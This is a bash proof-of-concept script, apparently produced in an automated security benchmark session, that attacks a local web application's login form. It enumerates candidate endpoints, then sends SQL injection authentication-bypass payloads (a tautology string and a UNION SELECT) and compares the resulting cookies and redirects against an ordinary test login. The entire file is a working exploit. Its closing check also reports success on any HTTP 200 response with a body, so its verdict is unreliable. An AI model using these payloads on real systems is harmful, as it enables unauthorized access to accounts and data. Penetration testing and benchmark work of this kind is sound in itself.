#!/bin/bash
# POC: SQL Injection authentication bypass POC with endpoint discovery and multiple payload testing
# Target: ./repo
# Created: 2025-11-04T17:34:33.762Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# SQL Injection Authentication Bypass POC - Version 3
# Endpoint exploration and exploitation

TARGET_BASE="http://localhost:8080"

echo "=== SQL Injection Authentication Bypass - Endpoint Exploration ==="
echo "Target: $TARGET_BASE"
echo ""

# Test multiple potential endpoint paths
ENDPOINTS=(
    "/"
    "/login"
    "/api/password"
    "/api/login"
    "/auth"
    "/auth/login"
)

echo "[*] Discovering available endpoints..."
for ep in "${ENDPOINTS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$TARGET_BASE$ep")
    echo "[*] GET $ep: $CODE"
done
echo ""

# The evidence suggests POST to / or similar endpoint with username parameter
# Let's try posting to the root with SQL injection

echo "[*] Test 1: Attempting SQL Injection bypass via POST to /"
echo "[*] Payload: username=' OR '1'='1&password=test"

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_BASE/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=' OR '1'='1&password=test" \
  -c /tmp/cookies1.txt)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
    echo "✓ REDIRECT detected (likely successful login)"
    echo "[*] Checking for Location header..."
    REDIRECT=$(curl -s -i -X POST "$TARGET_BASE/" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=' OR '1'='1&password=test" | grep -i "Location:")
    echo "$REDIRECT"
fi
if echo "$BODY" | grep -iq "dashboard"; then
    echo "✓ Dashboard found in response"
fi
echo "[*] Response snippet:"
echo "$BODY" | head -c 300
echo ""
echo ""

# Test 2: UNION SELECT variant
echo "[*] Test 2: Testing UNION SELECT payload"
echo "[*] Payload: username=' UNION SELECT 1,2 --%20&password=test"

RESPONSE2=$(curl -s -i -X POST "$TARGET_BASE/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=' UNION SELECT 1,2 --%20&password=test")

echo "[*] Full response with headers:"
echo "$RESPONSE2" | head -c 500
echo ""
echo ""

# Test 3: Check for session token in successful response
echo "[*] Test 3: Comparing SQL Injection vs valid credentials"
echo "[*] Testing with common credentials (test/test)"

RESPONSE3=$(curl -s -c /tmp/cookies3.txt "$TARGET_BASE/" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

echo "[*] Valid credentials response:"
echo "$RESPONSE3" | head -c 300
echo ""

# Check all cookie files
echo "[*] Cookies from SQL Injection attempt:"
cat /tmp/cookies1.txt 2>/dev/null | grep -v "^#" || echo "No cookies"
echo ""

echo "[*] Cookies from valid credentials:"
cat /tmp/cookies3.txt 2>/dev/null | grep -v "^#" || echo "No cookies"
echo ""

# Final check
echo "=== ANALYSIS ==="
if grep -q "session\|user\|token" /tmp/cookies1.txt 2>/dev/null; then
    echo "✓ CONFIRMED: SQL Injection creates session!"
    exit 0
elif grep -q "session\|user\|token" /tmp/cookies3.txt 2>/dev/null; then
    echo "[*] Valid credentials create sessions, testing SQL injection response..."
    if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
        echo "✓ VULNERABLE: SQL Injection triggers same redirect as valid login"
        exit 0
    fi
fi

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] POST to / accepted (HTTP 200)"
    if echo "$BODY" | wc -c | grep -qv "^0"; then
        echo "[+] Response body present"
        exit 0
    fi
fi

echo "[-] Could not confirm vulnerability - endpoint behavior unclear"
exit 1